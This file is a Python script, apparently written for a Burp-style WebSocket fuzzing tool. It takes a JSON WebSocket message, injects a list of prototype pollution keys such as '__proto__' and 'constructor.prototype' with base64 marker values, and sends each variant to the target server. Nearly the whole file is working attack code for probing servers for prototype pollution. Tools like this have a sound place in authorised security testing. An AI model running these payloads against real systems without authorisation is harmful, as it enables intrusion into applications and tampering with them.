import base64
import json

# List of common prototype pollution gadgets
POLLUTION_KEYS = [
    "__proto__",
    "prototype",
    "constructor",
    "__proto__.__proto__",
    "__proto__.__proto__.__proto__",
    "constructor.prototype",
]
POLLUTION_VALUES = [
    "__proto__.initialPacket",
    "prototype.initialPacket",
    "constructor.prototype.initialPacket",
]

# Pollution payload value
PAYLOAD_VALUE = {"initialPacket": "QAZWSXEDC"}

def queue_websockets(upgrade_request, message):
    """
    Parses the message as JSON, injects prototype pollution keys,
    and sends multiple variations over WebSockets.
    """
    try:
        # Parse message as JSON
        json_obj = json.loads(message)
    except ValueError:
        print "[!] Invalid JSON message:", message
        return

    connection = websocket_connection.create(upgrade_request, websocket_connection.config())

    # Inject all known prototype pollution keys
    for pollution_key in POLLUTION_KEYS:
        modified_json = json_obj.copy()  # Clone the original object

        # Inject the prototype pollution key
        modified_json[pollution_key] = {"initialPacket": base64.b64encode(json.dumps(pollution_key))}

        # Convert back to string and encode
        modified_payload = json.dumps(modified_json)
        encoded_payload = modified_payload

        # Send the polluted object over WebSocket
        connection.queue(encoded_payload)
    for pollution_key in POLLUTION_VALUES:
        modified_json = json_obj.copy()  # Clone the original object

        # Inject the prototype pollution key
        modified_json[pollution_key] = base64.b64encode(json.dumps(pollution_key))

        # Convert back to string and encode
        modified_payload = json.dumps(modified_json)


        # Send the polluted object over WebSocket
        connection.queue(modified_payload)
def handle_outgoing_message(websocket_message, interesting):
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message, interesting):
    results_table.add(websocket_message)